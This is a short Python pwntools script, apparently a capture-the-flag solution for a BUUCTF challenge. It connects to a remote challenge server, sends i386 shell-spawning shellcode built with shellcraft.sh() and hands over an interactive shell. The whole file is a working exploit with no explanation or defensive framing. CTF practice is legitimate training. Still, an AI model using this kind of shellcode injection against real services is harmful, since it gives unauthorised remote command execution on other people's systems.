from pwn import *
context(arch='i386', log_level='debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27164)
elf = ELF('./pwn')
io.sendline(asm(shellcraft.sh()))
io.interactive()